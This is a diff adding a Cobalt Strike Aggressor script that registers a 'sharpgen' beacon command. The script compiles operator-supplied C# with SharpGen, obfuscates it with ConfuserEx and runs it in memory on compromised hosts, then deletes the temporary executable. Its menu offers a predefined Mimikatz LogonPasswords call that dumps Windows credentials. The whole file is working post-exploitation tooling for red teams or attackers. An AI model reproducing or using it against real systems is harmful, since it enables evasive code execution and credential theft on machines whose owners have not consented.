@@ -1,0 +1,113 @@
+$dotnetPath = "/usr/bin/dotnet";
+$sharpgenPath = "/root/git/SharpGen-fastlorenzo/bin/Debug/netcoreapp2.1/SharpGen.dll";
+$tempPath = "/tmp/";
+$confusePath = "/root/git/SharpGen-fastlorenzo/confuse.cr";
+
+beacon_command_register("sharpgen", "Compile and execute C-Sharp","Synopsis: sharpgen [code]\n");
+
+sub generate_exec_id
+{
+	return "sharpgen_" . int(rand() * 100000);
+}
+
+sub parse_cs_code # ($1=C# code)
+{
+	# remove the sharpgen command
+	$rawCode = replace($1, "sharpgen ", "");
+	# escape the double quotes
+	$escapedCode = replace($rawCode, '"', '\"');
+	return $escapedCode;
+}
+
+sub compile_cs_code # ($1=execution ID, $2=beacon ID, $3=C# code)
+{
+	$execId = $1;
+	$bid = $2;
+	$csCode = $3;
+	$exeFilePath = $tempPath . $execId . ".exe";
+
+	@command = @($dotnetPath, $sharpgenPath, '-f', $exeFilePath, '--confuse', $confusePath, $csCode);
+	blog2($bid, "Running command " . @command);
+	$proc = exec(@command);
+	@data = readAll($proc);
+	foreach $value (@data)
+	{
+		blog2($bid, $value);
+		if('Compiled assembly written' isin $value)
+		{
+			# wait for the exe file to be fully written to disk
+			sleep(100);
+			return $exeFilePath;
+		}
+	}
+	# compilation failed, return an empty string
+	return "";
+}
+
+sub execute_exe # ($1=bid, $2=exe file path)
+{
+	$bid = $1;
+	$exeFilePath = $2;
+
+	bexecute_assembly($bid, $exeFilePath);
+
+	# Workaround to make sure file is deleted
+	while (-exists $exeFilePath)
+	{
+		sleep(100);
+		deleteFile($exeFilePath);
+	}
+}
+
+sub compile_and_exec_cs_code # ($1=bid, $2=full command line)
+{
+	$fullCmdLine = $2;
+	$bid = $1;
+	blog2($bid, "Full command line: " . $fullCmdLine);
+
+	$execId = generate_exec_id();
+	blog2($bid, "Execution ID: " . $execId);
+
+	$csCode = parse_cs_code($fullCmdLine);
+	blog2($bid, "Escaped C# code to execute: " . $csCode);
+
+	$exeFilePath = compile_cs_code($execId, $bid, $csCode);
+
+	if($exeFilePath eq "")
+	{
+		berror($bid, "Error compiling C# code!");
+		return;
+	}
+
+	execute_exe($bid, $exeFilePath);
+}
+
+alias sharpgen # ($1=bid, $0=full command line)
+{
+	compile_and_exec_cs_code($1, $0);
+}
+
+popup beacon {
+	menu "&SharpGen" {
+		item "&Compile and execute C# code"{
+			foreach $bid ($1){
+				$dialog = dialog("Compile and execute C# code", $null, lambda({
+					if($3["code"] eq "")
+					{
+						$code = $3["predef"];
+					}
+					else
+					{
+						$code = $3["code"];
+					}
+					compile_and_exec_cs_code($bid, $code);
+				}));
+				dialog_description($dialog, "Uses SharpGen to compile and execute C# code");
+				drow_text($dialog, "code", "C# code:");
+				drow_combobox($dialog, "predef", "Pre-defined commands:", @("Console.WriteLine(Mimikatz.LogonPasswords());"));
+				dbutton_action($dialog, "Execute");
+				dialog_show($dialog);
+			}
+		}
+	}
+}
